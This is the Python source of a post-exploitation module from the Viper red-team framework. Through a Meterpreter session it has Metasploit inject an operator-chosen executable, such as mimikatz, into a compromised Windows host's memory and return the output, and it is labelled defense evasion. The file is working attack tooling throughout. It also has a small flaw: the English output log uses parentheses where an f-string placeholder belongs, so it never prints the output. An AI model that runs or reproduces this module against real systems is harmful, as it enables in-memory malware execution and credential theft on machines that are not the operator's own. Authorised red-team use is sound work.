# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "内存执行PE文件(C++/C)"
    DESC_ZH = "在主机内存中注入PE文件并执行,文件后缀必须为exe.\n" \
              "模块只支持由C++及C编写的PE文件,如mimikatz,putty.\n" \
              "不支持由golang编写的exe文件,如nps,frp." \
              "如不需要获取输出(如session上线),无需勾选获取输出.\n" \
              "如需要获取PE执行之后的输出(如mimikatz),请勾选获取输出选项,并填写等待时间\n"

    NAME_EN = "Memory execution PE file (C++/C)"
    DESC_EN = "Inject the PE file into the host memory and execute it, the file suffix must be exe.\n" \
              "The module only supports PE files written in C++ and C, such as mimikatz, putty.\n" \
              "Exe files written by golang, such as nps, frp, are not supported.\n" \
              "If you don't need to get the output (such as the online session), you don't need to check <Get output>.\n" \
              "If you need to get the output after PE execution (such as mimikatz), please check the get output option and fill in the waiting time\n"

    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/gks12e"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = ["Viper"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionFileEnum(ext=['exe']),
        OptionBool(name='CHANNELIZED',
                   tag_zh="获取输出", desc_zh="是否需要获取shellcode执行后输出结果",
                   tag_en="Get output", desc_en="Whether need to get the output result after shellcode execution",
                   required=True, default=True),
        OptionStr(name='ARGUMENTS',
                  tag_zh="命令行参数", desc_zh="运行exe时输入的参数",
                  tag_en="Command line parameters", desc_en="Parameters entered when running the exe",
                  length=24),
        OptionInt(name='WAIT_OUTPUT',
                  tag_zh="等待输出时间(秒)",
                  desc_zh="shellcode执行后等待输出结果的时间(秒)(3-180)",
                  tag_en="Waiting for output time (seconds)",
                  desc_en="The time to wait for the output result after shellcode is executed (seconds)",
                  required=True,
                  default=3),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/execute_pe_in_memory_api"

    def check(self):
        """执行前的检查函数"""
        pe = self.get_fileoption_filepath(msf=True)
        if pe is None:
            return False, "请选择执行exe文件,文件后缀必须为exe", "Please choose to execute the exe file, the file suffix must be exe"
        else:
            self.set_msf_option(key='PE', value=pe)

        self.set_msf_option(key='CHANNELIZED', value=self.param('CHANNELIZED'))
        self.set_msf_option(key='ARGUMENTS', value=self.param('ARGUMENTS'))

        wait_ouput = self.param('WAIT_OUTPUT')
        if wait_ouput < 3:
            wait_ouput = 3
        elif wait_ouput > 180:
            wait_ouput = 180
        self.set_msf_option(key='WAIT_OUTPUT', value=wait_ouput)

        session = Session(self._sessionid)
        if session.is_alive:
            pass
        else:
            return False, "Session不可用", "Session is unavailable"
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"新进程PID :{data.get('pid')}", f"New process PID: {data.get('pid')}")
            self.log_good(f"新进程输出 :{data.get('output')}", f"New process output: (data.get('output'))")
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
